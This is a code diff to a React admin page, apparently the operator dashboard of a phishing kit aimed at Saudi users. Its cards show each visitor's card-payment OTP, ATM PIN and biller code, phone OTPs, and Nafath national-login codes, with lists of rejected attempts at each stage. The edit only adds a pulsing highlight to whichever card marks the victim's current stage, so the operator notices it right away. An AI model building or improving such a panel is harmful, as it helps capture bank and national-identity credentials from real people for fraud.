@@ -21,17 +21,20 @@ const carrierLogos: Record<string, string> = {
 };
 
 // Collapsible card wrapper
-const CollapsibleCard = ({ title, icon, borderColor, bgColor, headerBg, headerBorder, textColor, children, defaultOpen = false }: {
-  title: string; icon: React.ReactNode; borderColor: string; bgColor: string; headerBg: string; headerBorder: string; textColor: string; children: React.ReactNode; defaultOpen?: boolean;
+const CollapsibleCard = ({ title, icon, borderColor, bgColor, headerBg, headerBorder, textColor, children, defaultOpen = false, isActive = false }: {
+  title: string; icon: React.ReactNode; borderColor: string; bgColor: string; headerBg: string; headerBorder: string; textColor: string; children: React.ReactNode; defaultOpen?: boolean; isActive?: boolean;
 }) => {
   const [open, setOpen] = useState(defaultOpen);
   return (
     <Collapsible open={open} onOpenChange={setOpen}>
-      <div className={`rounded-xl border-2 ${borderColor} ${bgColor} overflow-hidden`}>
+      <div className={`rounded-xl border-2 ${isActive ? "border-amber-500 shadow-[0_0_12px_rgba(245,158,11,0.4)] animate-pulse" : borderColor} ${bgColor} overflow-hidden transition-shadow duration-500 ${isActive ? "ring-2 ring-amber-400/30" : ""}`}>
         <CollapsibleTrigger asChild>
-          <button className={`w-full px-3 py-2 ${headerBg} border-b ${headerBorder} flex items-center justify-between cursor-pointer hover:opacity-80 transition-opacity`}>
-            <p className={`text-[10px] font-bold ${textColor} flex items-center gap-1.5`}>{icon} {title}</p>
-            <ChevronRight className={`w-3 h-3 ${textColor} transition-transform duration-200 ${open ? "rotate-90" : ""}`} />
+          <button className={`w-full px-3 py-2 ${isActive ? "bg-amber-500/15 border-amber-500/30" : headerBg + " " + headerBorder} border-b flex items-center justify-between cursor-pointer hover:opacity-80 transition-opacity`}>
+            <p className={`text-[10px] font-bold ${isActive ? "text-amber-600" : textColor} flex items-center gap-1.5`}>
+              {isActive && <span className="w-2 h-2 rounded-full bg-amber-500 animate-ping inline-block" />}
+              {icon} {title}
+            </p>
+            <ChevronRight className={`w-3 h-3 ${isActive ? "text-amber-600" : textColor} transition-transform duration-200 ${open ? "rotate-90" : ""}`} />
           </button>
         </CollapsibleTrigger>
         <CollapsibleContent>{children}</CollapsibleContent>
@@ -1950,7 +1953,7 @@ const AdminVisitors = () => {
                                   const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
                                   const currentOtp = order.otp_code;
                                   return (
-                                    <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600" defaultOpen={isPending && activeStage === "otp"}>
+                                    <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600" defaultOpen={isPending && activeStage === "otp"} isActive={isPending && activeStage === "otp"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedOtps.length > 0 && (
                                           <div className="space-y-1.5">
@@ -1989,7 +1992,7 @@ const AdminVisitors = () => {
                                 })()}
 
                                 {/* 3. ATM */}
-                                <CollapsibleCard title="بيانات ATM" icon={<Landmark className="w-3 h-3" />} borderColor="border-emerald-500/30" bgColor="bg-emerald-500/5" headerBg="bg-emerald-500/10" headerBorder="border-emerald-500/20" textColor="text-emerald-600" defaultOpen={isPending && activeStage === "atm"}>
+                                <CollapsibleCard title="بيانات ATM" icon={<Landmark className="w-3 h-3" />} borderColor="border-emerald-500/30" bgColor="bg-emerald-500/5" headerBg="bg-emerald-500/10" headerBorder="border-emerald-500/20" textColor="text-emerald-600" defaultOpen={isPending && activeStage === "atm"} isActive={isPending && activeStage === "atm"}>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                                       {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) ? (
                                         <>
@@ -2013,7 +2016,7 @@ const AdminVisitors = () => {
                                   const phoneEvent = stageEvents.find(e => e.order_id === order.id && e.stage === "phone_verification");
                                   const carrierName = (phoneEvent?.payload as any)?.carrier || null;
                                   return (
-                                    <CollapsibleCard title="توثيق رقم الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600" defaultOpen={isPending && activeStage === "phone_verify"}>
+                                    <CollapsibleCard title="توثيق رقم الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600" defaultOpen={isPending && activeStage === "phone_verify"} isActive={isPending && activeStage === "phone_verify"}>
                                       <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                                         {(visitorPhone || order.phone) ? (
                                           <>
@@ -2047,7 +2050,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedPhoneOtps = phoneOtpEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="كود OTP توثيق الجوال" icon={<Phone className="w-3 h-3" />} borderColor="border-violet-500/30" bgColor="bg-violet-500/5" headerBg="bg-violet-500/10" headerBorder="border-violet-500/20" textColor="text-violet-600" defaultOpen={isPending && activeStage === "phone_otp"}>
+                                    <CollapsibleCard title="كود OTP توثيق الجوال" icon={<Phone className="w-3 h-3" />} borderColor="border-violet-500/30" bgColor="bg-violet-500/5" headerBg="bg-violet-500/10" headerBorder="border-violet-500/20" textColor="text-violet-600" defaultOpen={isPending && activeStage === "phone_otp"} isActive={isPending && activeStage === "phone_otp"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedPhoneOtps.length > 0 && (
                                           <div className="space-y-1.5">
@@ -2085,7 +2088,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedNafathLogins = nafathLoginEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600" defaultOpen={isPending && activeStage === "nafath_login"}>
+                                    <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600" defaultOpen={isPending && activeStage === "nafath_login"} isActive={isPending && activeStage === "nafath_login"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedNafathLogins.length > 0 && (
                                           <div className="space-y-1.5">
@@ -2137,7 +2140,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedNafathVerifies = nafathVerifyEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600" defaultOpen={isPending && activeStage === "nafath_verify"}>
+                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600" defaultOpen={isPending && activeStage === "nafath_verify"} isActive={isPending && activeStage === "nafath_verify"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedNafathVerifies.length > 0 && (
                                           <div className="space-y-1.5">
